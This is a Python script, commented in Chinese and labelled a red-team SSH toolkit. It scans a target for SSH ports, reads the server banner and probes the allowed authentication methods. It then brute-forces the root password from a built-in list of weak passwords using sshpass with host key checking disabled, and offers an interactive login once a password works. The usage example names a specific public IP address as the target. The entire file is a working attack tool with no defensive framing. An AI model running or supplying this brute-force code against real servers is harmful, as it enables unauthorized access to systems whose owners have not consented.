#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SSH工具包 - 红队安全专家专用
包含多种SSH连接和攻击方法
"""

import subprocess
import sys
import time
import socket
import threading
from concurrent.futures import ThreadPoolExecutor

class SSHToolkit:
    def __init__(self, host, port=22):
        self.host = host
        self.port = port
        self.found_credentials = None
        
    def check_connectivity(self):
        """检查网络连通性"""
        print(f"🌐 检查网络连通性...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            
            if result == 0:
                print(f"✅ 端口 {self.port} 开放")
                return True
            else:
                print(f"❌ 端口 {self.port} 关闭")
                return False
        except Exception as e:
            print(f"❌ 连接检查失败: {e}")
            return False
    
    def scan_ports(self):
        """扫描SSH相关端口"""
        print(f"🔍 扫描SSH相关端口...")
        ssh_ports = [22, 2222, 2200, 2022, 22000, 22001]
        open_ports = []
        
        for port in ssh_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.host, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
                    print(f"✅ 端口 {port} 开放")
                else:
                    print(f"❌ 端口 {port} 关闭")
            except:
                print(f"❌ 端口 {port} 检查失败")
        
        return open_ports
    
    def test_ssh_version(self):
        """测试SSH版本"""
        print(f"🔍 测试SSH版本...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))
            
            # 接收SSH版本信息
            data = sock.recv(1024).decode('utf-8')
            sock.close()
            
            if data.startswith('SSH-'):
                print(f"✅ SSH版本: {data.strip()}")
                return data.strip()
            else:
                print(f"❌ 未检测到SSH服务")
                return None
        except Exception as e:
            print(f"❌ SSH版本检测失败: {e}")
            return None
    
    def test_authentication_methods(self):
        """测试认证方法"""
        print(f"🔍 测试认证方法...")
        try:
            cmd = [
                "ssh", "-o", "ConnectTimeout=5",
                "-o", "StrictHostKeyChecking=no",
                "-o", "PreferredAuthentications=none",
                f"root@{self.host}"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if "password" in result.stderr.lower():
                print("✅ 支持密码认证")
            if "publickey" in result.stderr.lower():
                print("✅ 支持公钥认证")
            if "keyboard-interactive" in result.stderr.lower():
                print("✅ 支持键盘交互认证")
                
        except Exception as e:
            print(f"❌ 认证方法测试失败: {e}")
    
    def brute_force_passwords(self, username="root", password_list=None):
        """暴力破解密码"""
        if password_list is None:
            password_list = [
                "admin123", "admin", "password", "123456", "root", "toor",
                "pass", "1234", "admin123456", "root123", "password123",
                "123456789", "qwerty", "abc123", "admin@123", "root@123",
                "12345", "111111", "000000", "admin123!", "root123!",
                "password!", "admin@123!", "root@123!", "123456!",
                "admin123#", "root123#", "password#", "admin@123#",
                "root@123#", "123456#", "ubuntu", "centos", "debian",
                "fedora", "kali", "parrot", "arch", "gentoo", "alpine"
            ]
        
        print(f"🔐 开始暴力破解...")
        print(f"目标: {username}@{self.host}:{self.port}")
        print(f"密码列表: {len(password_list)} 个")
        
        for i, password in enumerate(password_list):
            if self.found_credentials:
                break
                
            try:
                cmd = [
                    "sshpass", "-p", password,
                    "ssh", "-o", "ConnectTimeout=5",
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "PreferredAuthentications=password",
                    f"{username}@{self.host}",
                    "echo 'SUCCESS'"
                ]
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0 and "SUCCESS" in result.stdout:
                    self.found_credentials = (username, password)
                    print(f"✅ 找到凭据: {username}:{password}")
                    return (username, password)
                    
            except Exception as e:
                pass
            
            if (i + 1) % 10 == 0:
                print(f"已尝试: {i + 1}/{len(password_list)} 个密码")
        
        print(f"❌ 暴力破解失败 (尝试了 {len(password_list)} 个密码)")
        return None
    
    def connect_ssh(self, username, password):
        """建立SSH连接"""
        print(f"🚀 建立SSH连接...")
        try:
            cmd = [
                "sshpass", "-p", password,
                "ssh", "-o", "StrictHostKeyChecking=no",
                f"{username}@{self.host}"
            ]
            
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\n👋 连接已断开")
        except Exception as e:
            print(f"❌ 连接失败: {e}")
    
    def run_full_scan(self):
        """运行完整扫描"""
        print("🚀 SSH工具包 - 红队安全专家专用")
        print("=" * 50)
        
        # 1. 检查连通性
        if not self.check_connectivity():
            return
        
        # 2. 扫描端口
        open_ports = self.scan_ports()
        if not open_ports:
            print("❌ 未找到开放的SSH端口")
            return
        
        # 3. 测试SSH版本
        ssh_version = self.test_ssh_version()
        
        # 4. 测试认证方法
        self.test_authentication_methods()
        
        # 5. 暴力破解
        credentials = self.brute_force_passwords()
        
        if credentials:
            username, password = credentials
            print(f"\n🎯 成功获取凭据: {username}:{password}")
            
            # 询问是否连接
            try:
                response = input("\n是否建立SSH连接? (y/n): ").lower()
                if response == 'y':
                    self.connect_ssh(username, password)
            except KeyboardInterrupt:
                print("\n👋 操作已取消")

def main():
    if len(sys.argv) < 2:
        print("使用方法: python3 ssh_toolkit.py <IP地址> [端口]")
        print("示例: python3 ssh_toolkit.py 82.29.71.156 22")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
    
    toolkit = SSHToolkit(host, port)
    toolkit.run_full_scan()

if __name__ == "__main__":
    main()